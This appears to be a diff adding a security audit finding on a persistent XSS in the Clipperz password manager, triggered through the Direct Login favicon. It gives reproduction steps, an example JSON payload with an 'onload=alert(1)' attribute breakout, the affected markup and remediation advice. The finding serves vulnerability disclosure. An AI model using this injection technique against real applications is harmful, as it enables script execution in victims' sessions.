@@ -1,0 +1,62 @@
+CLP-01-015 Persistent XSS on Index Page via Direct Login Favicon (Critical)
+
+Similar to the issue described in CLP-01-014, a persistent XSS can be
+triggered using the Direct Login feature. Clipperz attempts to load the
+favicon of the linked website and display its URL inside the src
+attribute of an IMG element. An attacker can cause the bookmarklet to
+deliver a maliciously prepared URL that, in conjunction with the favicon
+display, leads to an XSS attack.
+
+Note that this attack is capable of executing arbitrary attacker
+controlled JavaScript right after the victim logged in, because the
+vulnerable element is being shown on the index page. It is further
+possible to create a malicious page that will fill the bookmarklet?s
+textarea with arbitrary content. The victim would have no way to detect
+that something was injected and will willingly copy & paste it into the
+clippers application?s card creator form.
+
+Steps to reproduce:
+Copy malicious JSON into card editor for ?Direct Login?
+Create the card
+Logout
+Log in again
+Attacker?s JavaScript executes
+
+Example JSON to inject the payload:
+{"page": {"title": ""},
+"form": {"attributes": {"action": "javascript://\"onload=alert(1)//",
+"method": null},
+"inputs": [{"type": "text",
+"name": "username",
+"value": ""},
+{"type": "password",
+"name": "password",
+"value": ""}]},
+"version": "0.2.3"}
+
+Affected Markup in Clipperz application:
+<img
+id="6a103aa5ab36f0c34cebde816f468bfd9550ca5bbbce67470a0ec58ec7ea1a4b_faviconIMG"
+src="data:application/octet-stream;charset=utf-8;base64,AAABAAEAFxcAAAEAGAD8BgAAFgAAACgAAAAXAAAALgAAAAEAGAAAAAAAAAAAABIXAAASFwAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo="
+onload="alert(1)///favicon.ico&quot;"></td><td valign="top"><a
+class="directLoginItemTitle">adadadsadsa</a></td><td align="right"
+valign="top"><a
+class="directLoginItemEditButton">show</a></td></tr></tbody></table></li><li
+class=" "
+id="a88d6fc245559afc38aee293fb59790233242dad2633ed61dcc110e2e61644c4"><table
+border="0" cellpadding="0" cellspacing="0"><tbody><tr><td align="center"
+valign="top" width="20"><img
+id="a88d6fc245559afc38aee293fb59790233242dad2633ed61dcc110e2e61644c4_faviconIMG"
+src="data:application/octet-stream;charset=utf-8;base64,AAABAAEAFxcAAAEAGAD8BgAAFgAAACgAAAAXAAAALgAAAAEAGAAAAAAAAAAAABIXAAASFwAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo="
+onload="alert(1)///favicon.ico&quot;"></td><td valign="top"><a
+class="directLoginItemTitle">unnamed record</a></td><td align="right"
+valign="top"><a class="directLoginItemEditButton">show</a>
+
+It must be ensured that any form of user controlled data is being
+filtered and encoded properly. It has shown, that the JSON processing
+for direct logins is a particularly vulnerable element of the Clipperz
+application and deserves special attention. We believe, that the
+bookmarklet is easily exposed to injection attacks and that the content
+of the textarea for direct login data is a dangerous and easy to exploit
+attack vector and needs to be treated as such by the Clipperz
+application upon processing its data.
